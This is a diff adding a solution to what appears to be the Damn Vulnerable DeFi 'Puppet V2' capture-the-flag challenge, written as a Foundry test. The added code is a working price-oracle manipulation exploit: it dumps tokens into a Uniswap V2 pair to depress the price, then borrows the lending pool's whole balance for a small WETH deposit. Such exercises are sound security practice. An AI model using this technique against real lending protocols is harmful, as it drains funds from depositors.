@@ -98,7 +98,39 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        (uint256 reserve0, uint256 reserve1,) = uniswapV2Exchange.getReserves();
+        console.log("Uniswap reserves before swap: %s WETH, %s token", reserve0, reserve1);
+        uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit required: %s WETH", depositRequired);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uint256 amountOut = uniswapV2Router.getAmountsOut(PLAYER_INITIAL_TOKEN_BALANCE, path)[1];
+        console.log("Amount of WETH received from swap: %s", amountOut);
+        uniswapV2Router.swapExactTokensForTokens({
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMin: amountOut,
+            path: path,
+            to: player,
+            deadline: block.timestamp + 5 minutes
+        });
+
+        (reserve0, reserve1,) = uniswapV2Exchange.getReserves();
+        console.log("Uniswap reserves after swap: %s WETH, %s token", reserve0, reserve1);
+
+        (bool success,) = payable(address(weth)).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
+        require(success, "Failed to wrap ETH into WETH");
+        console.log("Player WETH balance after swap: %s", weth.balanceOf(player));
+
+        depositRequired = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit required: %s WETH", depositRequired);
+
+        weth.approve(address(lendingPool), depositRequired);
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, token.balanceOf(player));
+        console.log("recovery token balance: %s", token.balanceOf(recovery));
     }
 
     /**
